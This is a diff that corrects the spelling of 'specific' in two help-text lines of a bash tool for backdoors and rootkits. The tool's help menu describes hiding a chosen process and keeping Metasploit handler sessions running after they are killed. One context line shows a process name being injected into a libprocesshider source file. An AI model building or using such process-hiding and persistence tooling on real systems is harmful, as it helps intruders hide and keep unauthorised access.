@@ -44,7 +44,7 @@ echo " | "
 echo " |_ "
 echo "    Options: $name [options] backdoor/rootkits "
 echo ""
-echo -e $okegreen"	     --i / --inject    "$RESET"||  this option will be "$okegreen"hidden your spesific process "$RESET"( Ghost )"
+echo -e $okegreen"	     --i / --inject    "$RESET"||  this option will be "$okegreen"hidden your specific process "$RESET"( Ghost )"
 echo ""
 echo -e $okegreen"	     --u / --unlimited "$RESET"||  Unlimited your backdoor/rootkit  and sessions in metasploit handler"
 echo -e "				   "$okegreen"Even when it killed, it will re-run again."
@@ -93,7 +93,7 @@ echo
 sleep 2
 echo $babe > $conf
 s0=$(cat $conf | cut -d ' ' -f1)
-echo -e $okegreen"    +$RESET Settings libprocess for spesific rootkit/backdoor"
+echo -e $okegreen"    +$RESET Settings libprocess for specific rootkit/backdoor"
 sleep 2
 echo
 sed s#HIDEN_INJECT_POINT#$babe#g $pwd/lib/processhider.c > $pwd/tmp/libprocesshider.c
